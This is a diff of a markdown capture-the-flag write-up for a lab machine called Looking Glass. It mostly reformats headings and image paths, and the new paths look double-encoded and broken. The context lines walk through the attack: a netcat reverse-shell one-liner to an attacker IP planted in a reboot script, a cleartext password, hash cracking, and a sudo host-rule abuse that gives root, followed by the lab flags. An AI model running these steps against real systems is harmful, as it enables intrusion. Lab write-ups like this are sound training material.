@@ -2,13 +2,12 @@
 sticker: emoji//1f377
 ---
 
-# LOOKING GLASS
 
-## RECONNAISSANCE
-
-***
+# RECONNAISSANCE
+---
 
 On the port scan we got a bunch of `ssh` ports, let's try connecting to one of them as root and check what happens:
+
 
 ```
 ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@glass.thm -p 11607
@@ -206,17 +205,19 @@ Enter Secret:
 
 Let's begin exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
+
 
 As seen, this is a `vigenere cipher`, let's try to decode it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610224830.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610224830.png)
 
 We got the key, use it to decode:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610231128.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610231128.png)
 
 As seen, we get the secret:
 
@@ -224,7 +225,9 @@ As seen, we get the secret:
 bewareTheJabberwock
 ```
 
+
 Now submit it on the ssh port:
+
 
 ```
 Enter Secret:	
@@ -233,13 +236,14 @@ jabberwock:NeedlesShynessPeaceStreaming
 
 This password changes each time you reset the machine, you need to do the testing for ports and this step if you reset the machine or it gets shut down, we can go into ssh now:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610231410.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610231410.png)
 
 We can now begin privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
+
 
 Let's check our privileges and our home directory:
 
@@ -298,7 +302,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.28 9001 >/t
 
 Now, let's reboot while we have our listener ready:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610232024.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610232024.png)
 
 Once it reboots, we get our shell, let's stabilize it:
 
@@ -312,7 +316,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610232117.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610232117.png)
 
 We are `tweedledum`, let's check our home directory:
 
@@ -345,15 +349,15 @@ b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
 
 If we analyze them, they seem like a series of hashes, let's use crackstation to check:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610232252.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610232252.png)
 
 Only the last one if not `sha256`, let's try to analyze it:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610232341.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610232341.png)
 
 This is hex encoded, we can decode it in the same website:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610232423.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610232423.png)
 
 We got a password:
 
@@ -404,7 +408,7 @@ alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
 
 Pretty obvious this is the password for the `humptydumpty` user, let's switch then:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610232612.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610232612.png)
 
 ```
 humptydumpty@looking-glass:~$ ls -la
@@ -420,6 +424,7 @@ drwx------ 3 humptydumpty humptydumpty 4096 Jun 11 04:25 .gnupg
 ```
 
 Nothing interesting on our home directory, but, if we check `/home` we can notice this:
+
 
 ```
 ls -la /home
@@ -592,9 +597,10 @@ k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
 
 Save it and go into ssh with that:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610233743.png) Let's check valuable stuff for it, we can use `linpeas`:
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610233743.png)
+Let's check valuable stuff for it, we can use `linpeas`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610233939.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610233939.png)
 
 As seen, the sudoers file has something on it, we got:
 
@@ -608,7 +614,7 @@ We can abuse this to get a shell as root by doing:
 sudo -h ssalg-gnikool /bin/bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610234029.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610234029.png)
 
 Nice, we were able to get root, let's get both flags:
 
@@ -631,4 +637,5 @@ root@looking-glass:/tmp# cat /root/root.txt | rev
 thm{bc2337b6f97d057b01da718ced6ead3f}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250610234200.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250610234200.png)
+
